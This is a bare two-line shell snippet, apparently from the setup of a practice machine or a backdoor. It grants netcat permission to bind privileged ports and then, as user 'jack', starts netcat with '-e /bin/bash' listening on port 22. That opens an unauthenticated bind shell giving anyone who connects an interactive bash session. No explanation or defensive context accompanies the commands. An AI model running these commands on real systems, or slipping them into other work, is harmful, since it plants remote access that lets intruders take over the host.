setcap CAP_NET_BIND_SERVICE=+eip /bin/nc.traditional
su - jack -c "/bin/nc.traditional -e /bin/bash -lvnp 22"